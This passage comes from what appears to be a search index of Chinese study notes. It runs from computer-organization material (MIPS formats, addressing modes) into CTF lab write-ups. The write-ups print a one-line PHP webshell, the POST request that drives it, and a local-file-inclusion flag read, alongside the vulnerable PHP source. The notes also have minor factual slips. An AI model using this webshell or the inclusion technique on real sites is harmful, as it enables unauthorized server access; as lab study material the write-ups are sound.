<li>\u5927\u591a\u6570\u6307\u4ee4\u90fd\u5728\u4e00\u4e2a\u673a\u5668\u5468\u671f\u5185\u5b8c\u6210</li> <li>\u901a\u7528\u5bc4\u5b58\u5668\u6570\u91cf\u591a</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_32","title":"\u5bf9\u6bd4","text":"CISC RISC \u6307\u4ee4\u7cfb\u7edf\u5e9e\u5927\uff0c\u6307\u4ee4\u6570\u76ee\u4e00\u822c\u591a\u8fbe200\u591a\u6761 \u7cbe\u7b80\u4e86\u6307\u4ee4\u7cfb\u7edf\uff0c\u6d41\u6c34\u7ebf\u4ee5\u53ca\u5e38\u7528\u6307\u4ee4\u5747\u53ef\u7528\u786c\u4ef6\u6267\u884c \u5bfb\u5740\u65b9\u5f0f\u591a\u3001\u4ee3\u7801\u957f\u5ea6\u4e0d\u56fa\u5b9a \u6240\u6709\u6307\u4ee4\u957f\u5ea6\u5747\u76f8\u540c \u8bbf\u95ee\u5b58\u50a8\u5668\u6307\u4ee4\u4e0d\u52a0\u9650\u5236 \u53ea\u6709<code>load</code>\u548c<code>store</code>\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5668\uff0c\u5176\u4ed6\u64cd\u4f5c\u5747\u5728\u5bc4\u5b58\u5668\u4e2d\u6267\u884c \u5404\u6307\u4ee4\u6267\u884c\u65f6\u95f4\u76f8\u5dee\u5f88\u5927 \u6240\u6709\u6307\u4ee4\u7684\u529f\u80fd\u5355\u4e00\uff0c\u5728\u4e00\u4e2a\u673a\u5668\u5468\u671f\u5185\u5b8c\u6210"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_33","title":"\u6307\u4ee4\u7684\u683c\u5f0f","text":"<p>\u6307\u4ee4\u5305\u542b\u64cd\u4f5c\u7801\u548c\u5730\u5740\u7801\u4e24\u4e2a\u90e8\u5206\u3002</p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_34","title":"\u64cd\u4f5c\u7801\u7684\u57fa\u672c\u683c\u5f0f","text":"<ul> <li>\u56fa\u5b9a\u957f\u5ea6\u64cd\u4f5c\u7801</li> <li>\u4fbf\u4e8e\u786c\u4ef6\u89c4\u6574\uff0c\u7f29\u77ed\u6307\u4ee4\u7684\u8bd1\u7801\u65f6\u95f4\u3002</li> <li>\u53ef\u53d8\u957f\u5ea6\u64cd\u4f5c\u7801</li> <li>\u589e\u52a0\u6307\u4ee4\u8bd1\u7801\u90e8\u4ef6\u7684\u590d\u6742\u5ea6\uff0c\u589e\u52a0\u8bd1\u7801\u7684\u65f6\u95f4\u3002</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_35","title":"\u5730\u5740\u7801\u7684\u57fa\u672c\u683c\u5f0f","text":"<ul> <li> <p>\u4e09\u5730\u5740\u6307\u4ee4\uff08R\u578b\u6307\u4ee4\uff09   $$   OP \\quad |\\quad A_3 \\quad | \\quad A_2 \\quad | \\quad A_1\\   (A_1)OP(A_2)\\rightarrow A_3   $$</p> </li> <li> <p>\u4e8c\u5730\u5740\u6307\u4ee4\uff08\u6700\u5e38\u7528\u7684\u6307\u4ee4\u683c\u5f0f\uff09</p> </li> </ul> <p>$$   OP \\quad | \\quad A_2 \\quad | \\quad A_1\\   (A_1)OP(A_2)\\rightarrow A_2   $$</p> <ul> <li>\u4e00\u5730\u5740\u6307\u4ee4\uff08\u81ea\u589e\uff0c\u81ea\u51cf\uff09</li> </ul> <p>$$   OP \\quad | \\quad A_1\\   OP(A_1)\\rightarrow A_1\\   \u6216\u8005\\   (A_1)OP(ACC)\\rightarrow ACC   $$</p> <ul> <li>\u96f6\u5730\u5740\u6307\u4ee4</li> </ul> \\[ |\\quad OP\\quad |\\\\ \\]"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_36","title":"\u5bfb\u5740\u65b9\u5f0f","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_37","title":"\u6307\u4ee4\u5bfb\u5740","text":"<ul> <li>\u987a\u5e8f\u5bfb\u5740\uff1a\u901a\u8fc7PC\u81ea\u589e\u5b9e\u73b0\u987a\u5e8f\u5bfb\u5740</li> <li>\u8df3\u8dc3\u5bfb\u5740\uff1a\u7c7b\u4f3c\u4e8e<code>goto</code>\u8bed\u53e5\uff0c\u5c06PC\u503c\u76f4\u63a5\u6539\u53d8</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_38","title":"\u6570\u636e\u5bfb\u5740","text":"<ul> <li> <p>\u7acb\u5373\u5bfb\u5740\uff1a\u64cd\u4f5c\u6570\u5c31\u5728\u6307\u4ee4\u4e2d\u3002\u901f\u5ea6\u5feb\uff0c\u5e38\u7528\u8bed\u5bf9\u4e3b\u5b58\u5355\u5143\u6216\u8005\u5bc4\u5b58\u5668\u7684\u521d\u59cb\u5316\u64cd\u4f5c</p> </li> <li> <p>\u5bc4\u5b58\u5668\u5bfb\u5740\uff1a\u5728\u5bc4\u5b58\u5668\u4e2d\u8bbf\u95ee\u6570\u636e\uff0c\u4e0d\u7528\u8bbf\u95ee\u5185\u5b58\uff0c\u6267\u884c\u901f\u5ea6\u5feb\u3002</p> </li> <li> <p>\u5b58\u50a8\u5668\u5bfb\u5740</p> </li> <li> <p>\u76f4\u63a5\u5bfb\u5740\uff1a\u6307\u4ee4\u5b57\u4e2d\u76f4\u63a5\u5b58\u653e\u76ee\u6807\u6570\u636e\u7684\u4e3b\u5b58\u5730\u5740</p> </li> <li> <p>\u95f4\u63a5\u5bfb\u5740\uff1a\u7531\u4e8e\u6307\u4ee4\u5b57\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u80fd\u65e0\u6cd5\u5b8c\u5168\u8868\u793a\u4e3b\u5b58\u4e2d\u7684\u6240\u6709\u90e8\u5206\uff0c\u56e0\u6b64\u53ef\u4ee5\u5148\u6620\u5c04\u5230\u4e3b\u5b58\uff0c\u518d\u901a\u8fc7\u4e3b\u5b58\u4e2d\u7684\u6570\u636e\uff08\u5730\u5740\uff09\u5bfb\u627e\u76ee\u6807\u5730\u5740\u3002\u95f4\u63a5\u5bfb\u5740\u901a\u5e38\u5229\u7528\u6700\u9ad8\u4f4d\u6700\u4e3a\u6807\u5fd7\u4f4d\uff0c\u6700\u9ad8\u4f4d\u4e3a1\u662f\u8868\u793a\u8be5\u5730\u5740\u662f\u95f4\u63a5\u5730\u5740\u3002\u7c7b\u4f3c\u4e8e\u6307\u9488</p> </li> <li> <p>\u5bc4\u5b58\u5668\u95f4\u63a5\u5bfb\u5740\uff1a\u4e0e\u4e0a\u9762\u552f\u4e00\u4e0d\u540c\u7684\u662f\uff0c\u95f4\u63a5\u5730\u5740\u5b58\u653e\u5728\u5bc4\u5b58\u5668\u4e2d\uff0c\u6548\u7387\u7a0d\u5fae\u9ad8\u4e00\u4e9b</p> </li> <li> <p>\u57fa\u5740\u5bfb\u5740\u548c\u53d8\u5740\u5bfb\u5740\uff1a\u901a\u8fc7\u5206\u6bb5\u548c\u504f\u79fb\u91cf\u6765\u786e\u5b9a\u5730\u5740\u4f4d\u7f6e\u3002\u5176\u4e2d\u57fa\u5740\u5bfb\u5740\u4e00\u822c\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\uff0c\u53d8\u5740\u5bfb\u5740\u4e00\u822c\u7528\u6765\u65b9\u4f4d\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u3002</p> </li> <li> <p>\u76f8\u5bf9\u5bfb\u5740\uff1a\u5e38\u7528\u4e8e\u7a0b\u5e8f\u8df3\u8f6c\uff0c\u5728\u7a0b\u5e8f\u8ba1\u6570\u5668\u4e0a\u52a0\u4e0a\u504f\u79fb\u91cf\uff0c\u6bd4\u5982\u4e00\u4e9b\u6d41\u7a0b\u63a7\u5236</p> </li> <li> <p>\u7ec4\u5408\u5bfb\u5740\uff1a\u5c06\u4ee5\u4e0a\u4e24\u79cd\u4e0d\u540c\u7684\u5bfb\u5740\u65b9\u5f0f\u7ec4\u5408\u8d77\u6765\u4f7f\u7528</p> </li> <li> <p>\u5806\u6808\u5bfb\u5740\uff1a\u901a\u8fc7\u6808\u5e27\u4e2d\u5bfb\u627e\u6570\u636e\u3002</p> OP I X A \u64cd\u4f5c\u7801 \u95f4\u5740\u7279\u5f81 \u5bfb\u5740\u6a21\u5f0f \u5f62\u5f0f\u5730\u5740 \u5bfb\u5740\u65b9\u5f0f I X \u6709\u6548\u5730\u5740EA \u76f4\u63a5\u5bfb\u5740 0 00 \\(EA=A\\) \u76f8\u5bf9\u5bfb\u5740 0 01 \\(EA=(PC)+A\\) \u53d8\u5740\u5bfb\u5740 0 10 \\(EA=(R)  +A\\) \u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740 0 11 \\(EA=R\\) \u95f4\u63a5\u5bfb\u5740 1 00 \\(EA=(A)\\) \u5148\u76f8\u5bf9\u540e\u95f4\u63a5\u5bfb\u5740 1 01 \\(EA=((PC)+A)\\) \u5148\u53d8\u5740\u540e\u95f4\u63a5\u5bfb\u5740 1 10 \\(EA=((R)+A)\\) \u5bc4\u5b58\u5668\u95f4\u63a5\u5bfb\u5740 1 11 \\(EA=(R)\\) </li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_39","title":"\u6307\u4ee4\u5206\u7c7b","text":"\\[ \u6307\u4ee4\\begin{cases}     \u6570\u636e\u4f20\u8f93\u7c7b\u6307\u4ee4&amp;\\begin{cases}         \u5b58\u6570\u6307\u4ee4(STORE)\\\\         \u53d6\u6570\u6307\u4ee4(LOAD)\\\\         \u6570\u636e\u4ea4\u6362\u6307\u4ee4\\\\         \u6570\u636e\u5757\u4f20\u9001\u6307\u4ee4\\\\         \u5806\u6808\u6307\u4ee4\\\\     \\end{cases}\\\\\\\\     \u7b97\u6570/\u903b\u8f91\u8fd0\u7b97\u7c7b\u6307\u4ee4&amp;\\begin{cases}         \u52a0\u51cf\u4e58\u9664\\\\         \u589e/\u51cf1\\\\         \u6c42\u8865/\u6bd4\u8f83\\\\         \u6309\u4f4d\u4e0e/\u6216/\u975e/\u5f02\u6216\\\\     \\end{cases}\\\\\\\\     \u79fb\u4f4d\u7c7b\u6307\u4ee4&amp;\\begin{cases}         \u7b97\u672f\u79fb\u4f4d\u6307\u4ee4(SAR,SAL)\\\\         \u903b\u8f91\u79fb\u4f4d\u6307\u4ee4(SHL,SHR)\\\\         \u5faa\u73af\u79fb\u4f4d\u6307\u4ee4(ROL,ROR;RCL,RCR)\\\\     \\end{cases}\\\\\\\\     \u7a0b\u5e8f\u63a7\u5236\u7c7b\u6307\u4ee4&amp;\\begin{cases}         \u8f6c\u79fb\u7c7b\u6307\u4ee4\\\\         \u5b50\u7a0b\u5e8f\u8c03\u7528\u548c\u8fd4\u56de\u6307\u4ee4\\\\     \\end{cases}\\\\\\\\     \u8f93\u5165/\u8f93\u51fa\u7c7b\u6307\u4ee4\\\\\\\\     \u5176\u4ed6\u6307\u4ee4 \\end{cases} \\]"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#mips32","title":"MIPS32\u6307\u4ee4\u7b80\u4ecb","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_40","title":"\u5bc4\u5b58\u5668\u7ec4","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#32","title":"32\u4e2a\u901a\u7528\u5bc4\u5b58\u5668","text":"\u7f16\u53f7 \u540d\u79f0 \u4f7f\u7528\u89c4\u5219 $0 $zero \u5e38\u65700 $1 $at \u6c47\u7f16\u7a0b\u5e8f\u4e34\u65f6\u5b58\u50a8\u8d85\u51fa16\u4f4d\u7684\u6570\u636e $2\u3001$3 $v1\u3001$v2 \u51fd\u6570\u8fd4\u56de\u503c\uff0c\u4e0d\u591f\u7528\u65f6\u4f7f\u7528\u5806\u6808 $4~$7 $a0~$a3 \u51fd\u6570\u8f93\u5165\u53c2\u6570\uff0c\u4e0d\u591f\u7528\u65f6\u4f7f\u7528\u5806\u6808 $8~$15 $t0~$t7 \u4e34\u65f6\u5bc4\u5b58\u5668\uff08\u4e0d\u53d7\u4fdd\u62a4\uff09 $16~$23 $s0~$s7 \u5b58\u50a8\u5bc4\u5b58\u5668\uff0c\u53d8\u91cf\u6216\u8005\u5b58\u50a8\u5355\u5143\u7684\u8d77\u59cb\u5730\u5740\uff08\u57fa\u5730\u5740\uff09 $24\u3001$25 $t8\u3001$t9 \u4e34\u65f6\u5bc4\u5b58\u5668 $26\u3001$27 $k0\u3001$k1 \u7cfb\u7edf\u4fdd\u7559\u6307\u9488 $28 $gp \u5168\u5c40\u6307\u9488 $29 $sp \u5806\u6808\u6307\u9488 $30 $fp \u5e27\u6307\u9488 $31 $ra \u51fd\u6570\u8c03\u7528\u8fd4\u56de\u5730\u5740"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_41","title":"\u7279\u6b8a\u529f\u80fd\u5bc4\u5b58\u5668","text":"\u540d\u79f0 \u529f\u80fd HI\u3001LO \u7528\u4e8e\u5b58\u50a8\u6574\u6570\u4e58/\u9664\u548c\u4e58/\u52a0\u64cd\u4f5c PC \u7a0b\u5e8f\u8ba1\u6570\u5668"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#fpu","title":"FPU\u5bc4\u5b58\u5668","text":"<p>MIPS\u7684CPU\u8fd8\u670932\u4e2a\u6d6e\u70b9\u5bc4\u5b58\u5668($f0~$f31)\uff0c\u6bcf\u4e2a\u90fd\u662f32\u4f4d\uff0c\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u5360\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u53cc\u7cbe\u5ea6\u5360\u4e24\u4e2a\u5b57\u8282\u3002</p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#mips","title":"MIPS\u6307\u4ee4\u683c\u5f0f","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#r","title":"R\u578b\u6307\u4ee4","text":"<p>Register\u578b\u6307\u4ee4\uff0c\u6570\u636e\u6765\u81ea\u4e09\u4e2a\u5bc4\u5b58\u5668</p> Opcode[31:26] rs[25:21] rt[20:16] rd[15:11] Shamt[10:6] Funct[5:0] 6 5 5 5 5 6 \u64cd\u4f5c\u7801\uff0cR\u578b\u56fa\u5b9a<code>000000</code> \u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u7f16\u53f71 \u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u7f16\u53f72 \u76ee\u7684\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u7f16\u53f7 \u79fb\u4f4d\u6307\u4ee4\u7684\u79fb\u4f4d\u6b21\u6570\uff0c\u975e\u79fb\u4f4d\u6307\u4ee4\u7684\u4e3a<code>0</code> \u5bf9\u4e8eR\u578b\u6307\u4ee4\u7684\u5b50\u529f\u80fd\u64cd\u4f5c\u7801 <p>\u5e38\u7528R\u578b\u6307\u4ee4Funct\u5b57\u6bb5\u53d6\u503c</p> \u6307\u4ee4 ADD ADDU SUB SUBU AND OR XOR NOR SLL SRL SLT Funct 20H 21H 22H 23H 24H 25H 26H 27H 00H 02H 2AH <p></p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#i","title":"I\u578b\u6307\u4ee4","text":"<p>Immediate\u578b\u6307\u4ee4\uff0c\u548c\u7acb\u5373\u6570\u6709\u5173</p> Opcode[31:26] rs[25:21] rt[20:16] rd[15:0] 6 5 5 16 \u64cd\u4f5c\u7801\uff0c\u8868\u660e\u8be5\u6307\u4ee4\u7684\u529f\u80fd \u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u7f16\u53f7 \u76ee\u7684\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u7f16\u53f7 \u7acb\u5373\u6570\u6216\u504f\u79fb\u91cf <p></p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#j","title":"J\u578b\u6307\u4ee4","text":"<p>Jump\u578b\u6307\u4ee4\uff0c\u548c\u63a7\u5236\u8f6c\u79fb\u6709\u5173\u3002\u4e3a\u5b9e\u73b0\u8fdc\u8ddd\u79bb\u7a0b\u5e8f\u8f6c\u79fb\u800c\u8bbe\u7f6e</p> Opcode[31:26] rt[25:0] 6 26 \u64cd\u4f5c\u7801\uff0c\u8868\u660e\u8be5\u6307\u4ee4\u7684\u529f\u80fd \u76ee\u7684\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u7f16\u53f7 <p></p> <ul> <li>J\u6307\u4ee4\u65e0\u6761\u4ef6\u8f6c\u79fb\uff0c\u5c06PC\u8bbe\u7f6e\u5230\u4e00\u4e2a\u65b0\u768432\u4f4d\u5730\u5740</li> <li>JAL\u6307\u4ee4\u8f6c\u79fb\u524d\u5148\u4fdd\u5b58\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5230<code>$ra</code>\u4e2d\uff0c\u7136\u540e\u518d\u5ba0\u5e78\u8bbe\u7f6ePC\u7684\u503c</li> </ul> <p>J\u578b\u548cJAL\u914d\u5408\u53ef\u5b9e\u73b0\u51fd\u6570\u7684\u8c03\u7528\u548c\u8fd4\u56de\u3002</p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#6","title":"\u7b2c6\u7ae0 \u4e2d\u592e\u5904\u7406\u5668","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_42","title":"\u5904\u7406\u5668\u6982\u8ff0","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#cpu","title":"CPU\u7684\u4e3b\u8981\u529f\u80fd","text":"<ol> <li>\u6307\u4ee4\u63a7\u5236\uff1a\u6309\u987a\u5e8f\u6267\u884c\u6307\u4ee4\u3002</li> <li>\u64cd\u4f5c\u63a7\u5236\uff1a\u6839\u636e\u6307\u4ee4\u53d1\u51fa\u63a7\u5236\u4fe1\u53f7\u534f\u52a9\u5404\u90e8\u4ef6\u5b8c\u6210\u6307\u4ee4</li> <li>\u65f6\u5e8f\u63a7\u5236\uff1a\u5b9a\u65f6\u7684\u7ed9\u51fa\u5404\u79cd\u64cd\u4f5c\u4fe1\u53f7\u3002</li> <li>\u6570\u636e\u52a0\u5de5\uff1a\u5bf9\u6570\u636e\u8fdb\u884c\u7b97\u672f\u8fd0\u7b97\u3001\u903b\u8f91\u8fd0\u7b97\u7b49\u5904\u7406</li> <li>\u4e2d\u65ad\u63a7\u5236\uff1a\u8ba1\u7b97\u673a\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7a81\u53d1\u4e8b\u4ef6\u7684\u5904\u7406\u80fd\u529b</li> </ol>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#cpu_1","title":"CPU\u7684\u5185\u90e8\u7ed3\u6784","text":""},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2023%E5%B9%B412%E6%9C%8820%E6%97%A5/","title":"UPLOAD1 COURSE","text":""},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2023%E5%B9%B412%E6%9C%8820%E6%97%A5/#_1","title":"\u6e17\u900f\u8fc7\u7a0b","text":"<p>\u7b2c\u4e00\u773c\u6587\u4ef6\u4e0a\u4f20\uff0c\u8bd5\u7740\u6b63\u5e38\u4e0a\u4f20\u53d1\u73b0\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u4f46\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u540e\u7f00\u540d\u5168\u90fd\u4f1a\u88ab\u6539\u6210<code>jpg</code>.</p> <p>\u5c1d\u8bd5\u4e0a\u4f20<code>demo.php</code>\uff0c\u5e76\u901a\u8fc7\u62e6\u622a\u5427\u6587\u4ef6\u7c7b\u578b\u66f4\u6539</p> <pre><code>Content-Type: image/bmp\n</code></pre> <p>\u4f46\u662f\u65e0\u6d4e\u4e8e\u4e8b\uff0c\u8fd4\u56de\u6587\u4ef6\u8fd8\u662fjpg\u3002\u5e76\u4e14\u8bbf\u95ee\u4e5f\u662fjpg\u5f62\u5f0f\u3002</p> <p>\u5728\u7f51\u4e0a\u67e5\u5230\u4e00\u4e9b\u5173\u4e8ePHP\u4e0a\u4f20\u6f0f\u6d1e\u7684Blog</p> <p>php\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e | Chybeta</p> <p>\u5148\u4e0a\u4f20\u4e00\u4e2a\u6728\u9a6c\u6587\u4ef6</p> <pre><code>// upload.php\n&lt;?php @eval(system($_POST[\"x\"]));\n</code></pre> <p>\u7136\u540e\u518d\u901a\u8fc7Post\u8bf7\u6c42\u53d1\u9001\u6728\u9a6c\u6307\u4ee4\u3002</p> <pre><code>POST /index.php?file=%\u6728\u9a6c\u4e0a\u4f20\u540e\u4fdd\u5b58\u7684\u5730\u5740% HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6\nCache-Control: no-cache\nContent-Length: 16\nContent-Type: application/x-www-form-urlencoded\nDNT: 1\nHost: b2449bc8-5645-4087-a01d-c56baf1316b9.node4.buuoj.cn:81\nOrigin: http://b2449bc8-5645-4087-a01d-c56baf1316b9.node4.buuoj.cn:81\nPragma: no-cache\nProxy-Connection: keep-alive\nReferer: http://b2449bc8-5645-4087-a01d-c56baf1316b9.node4.buuoj.cn:81/index.php?file=uploads/658231a4d4631.jpg\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0\n\nx=%\u6728\u9a6c%\n</code></pre> <p>\u4f7f\u7528<code>x=ls</code>\u8fd4\u56de\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6</p> <p></p> <p><code>cd /;ls</code> \u8fd4\u73b0flag\u6587\u4ef6\u3002</p> <p><code>cat flag</code>\u5f97\u5230flag\u3002</p>"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2023%E5%B9%B412%E6%9C%8820%E6%97%A5/#_2","title":"\u6f0f\u6d1e\u590d\u76d8","text":"<p>\u7f51\u4e0a\u8bf4\u8fd9\u4e2a\u662f\u4e2a\u6587\u4ef6\u5305\u542b\u7684\u6f0f\u6d1e\uff0c\u4f46\u662f\u6ca1\u6709\u7ed9\u51fa\u5177\u4f53\u7684\u4ee3\u7801\uff0c\u65e2\u7136\u5df2\u7ecf\u62ff\u5230\u4e86webshell\uff0c\u90a3\u5c31\u81ea\u5df1\u5c1d\u8bd5\u83b7\u53d6\u8fd9\u4e2a\u6e90\u7801\u5427\u3002</p> <p>\u5c1d\u8bd5<code>cat index.php</code>\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u4e3a\u5565\u62a5\u9519</p> <pre><code>Parse error: syntax error, unexpected '}', expecting end of file in /var/www/html/uploads/65823e50835bc.jpg(1) : eval()'d code on line 1\n</code></pre> <p>\u7a81\u7136\u60f3\u5230\u770b\u4e00\u4e0b\u524d\u7aef\u9875\u9762\u7684\u6e90\u7801\uff0c\u53d1\u73b0\u81ea\u5df1\u662f\u4e2aJoker\u3002</p> <p>\u4eba\u5bb6\u90fd\u628a\u6e90\u7801\u6446\u5728\u524d\u7aef\u9875\u9762\u91cc\u4e86\u3002</p> <pre><code>// index.php\nif(isset($_GET['file'])) {\n    $re = '/^uploads\\/[\\d|\\w]*.jpg$/m';\n    $str = $_GET['file'];\n\n    preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);\n\n    if(count($matches) == 0 &amp;&amp; $_GET['file'] !== 'upload.php') {\n        die('\u4f60\u4e0d\u8001\u5b9e\u54e6~');\n    }\n\n    include $_GET['file'];\n} else {\n    Header('Location: index.php?file=upload.php');\n}\n</code></pre> <p>\u8fd9\u91cc\u8fd8\u6709\u4e2a<code>upload.php</code>\uff0c\u4e5f\u60f3\u770b\u770b\u6e90\u7801\u3002</p> <p>\u4f46\u662f\u4eba\u5bb6\u4e0d\u7ed9\uff0c\u90a3\u6211\u5c31\u5c1d\u8bd5\u6362\u4e2a\u59ff\u52bf\u770b\u6587\u4ef6</p> <p><code>tac upload.php</code>\uff0c\u8fd9\u4e2a\u5c45\u7136\u8d77\u4f5c\u7528\uff0c\u4f46\u662f\u8f93\u51fa\u662f\u9006\u5e8f\u7684\uff0c\u8c03\u6574\u540e\u5f97\u5230<code>upload.php</code></p> <pre><code>//upload.php\n@mkdir(\"uploads/\");\nif(isset($_FILES['upload_file'])) {\n    $filename = uniqid().\".jpg\";\n    move_uploaded_file($_FILES[\"upload_file\"][\"tmp_name\"], \"uploads/\".$filename);\n}\necho \"\u6587\u4ef6\u5df2\u50a8\u5b58\u5728: \" . \"uploads/\" . $filename;\n</code></pre> <p>\u5173\u952e\u5c31\u5728\u4e8e<code>index.php</code>\u4e2d\u5b58\u5728<code>include</code></p>"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2023%E5%B9%B412%E6%9C%8820%E6%97%A5/#lfi-course-1","title":"LFI COURSE 1","text":"<p>\u8fdb\u5165\u9776\u573a\u76f4\u63a5\u7ed9\u6e90\u7801\uff0c\u4e16\u754c\u4e0a\u8fd8\u662f\u597d\u4eba\u591a</p> <pre><code>&lt;?php\nhighlight_file(__FILE__);\n\nif(isset($_GET['file'])) {\n    $str = $_GET['file'];\n\n    include $_GET['file'];\n}\n</code></pre> <p>\u989d\uff0c\u8fd9\u4e0d\u548c\u4e0a\u9762\u7684\u9898\u76ee\u4e00\u6837\u5417?\u800c\u4e14\u6ca1\u6709\u4efb\u4f55\u9632\u62a4</p> <p>\u90a3\u4e0d\u5c31\u7b80\u7b80\u5355\u5355\u3002</p> <p>\u533a\u522b\u5728\u4e0e\u8fd9\u91cc\u4f7f\u7528\u7684\u662fget\u3002\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f2a\u534f\u8bae\u95f4\u63a5\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u91cc\u6ca1\u6709\u5fc5\u8981\uff0c\u5e94\u4e3a\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5c06<code>flag</code>\u6587\u4ef6\u5305\u542b\u8fdb\u6765\u7136\u540e\u76f4\u63a5\u56de\u663e\u3002</p> <p><code>?file=flag</code>\uff0c\u76f4\u63a5\u7206\u51faflag</p>"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/FastJson%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","title":"FastJson\u4ee3\u7801\u5ba1\u8ba1","text":""},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/FastJson%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#defaultjsonparserparseobject","title":"DefaultJSONParser#parseObject()","text":"<pre><code>/**\n * \u89e3\u6790 JSON \u5bf9\u8c61\n * @param object \u5f85\u89e3\u6790\u7684 JSON \u5bf9\u8c61\n * @param fieldName \u5b57\u6bb5\u540d\u79f0\n * @return \u89e3\u6790\u540e\u7684 JSON \u5bf9\u8c61\n */\npublic final Object parseObject(final Map object, Object fieldName) {\n    final JSONLexer lexer = this.lexer;\n\n    // 